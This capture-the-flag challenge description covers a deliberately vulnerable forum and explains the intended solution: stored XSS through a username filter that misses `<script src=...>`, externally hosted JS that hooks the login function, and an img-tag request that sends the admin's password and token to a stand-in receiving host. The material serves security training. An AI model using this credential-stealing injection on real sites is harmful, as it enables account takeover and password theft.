# HackTheStack - Bad Authentiation
### John Lee (2016)

# For the challengers
This challenge is for you to login as an admin for one of the hottest forum sites to come out since Yahoo! Answers.
In the developers' haste to get the product out, they missed some vital code to keep some nasty ne'er-do-wells from getting access to their site.

However, the creators aren't completely forgetful, there are some roadblocks in the way to do this. Don't be discouraged! Most of them are still insecure if you stretch the limits. (But don't stretch too much, the website might break because of you.)

There's a rumor that one of the admins have been logging in quite often. Login as them and extract a super-secret admin code that they use for everything. Seriously. They never took `ECE 404/CS 426`.

Present the code to one of the hosts to win!

## Some hints *[only show if necessary]*
- It is not SQL injection.
- Use XSS
- Have them look at the 'recent users' area.
- If they are having problems with the max entered size, have them upload a script onto https://gist.github.com/ and embed it as their username.
- Getting around CORS
  - Try creating an \<img> with the data included as a GET parameter.
  
# Hosts Only . . .
  
## Detailed Problem
The website is supposed to emulate a forum. Most forms of auth are secure *except* the `handle` which checks for `<script>` but not `<script src= . . .`. The challenger is supposed to inject some JS that replaces the login function with one that grabs the token or password. 

### Recommendation at this point
My BIGGEST recommendation is to use https://gist.github.com/. Once there they can make something called `c.js` and put some arbituary JS code in it. once there, use the **RAW** link as their handle and voila! Injected JS that they **CAN EDIT ACTIVELY**. This way if they break the site they can just change their code here to revert it.


Once grabbed, it will then send it to a page that listens for any request and grabs the parameters. ( We might want to provide this ). To send it out, the easiest method is to bind it with an img tag. \<img src="https://mysecretwebsite.ioo/receive?user=admin&password=yadada&authToken=1234567">. 

Once received, they emulate that same request on the web page and get the new page, an admin page that contains the number. It only works on verified login, so they can't bypass this any other way. 
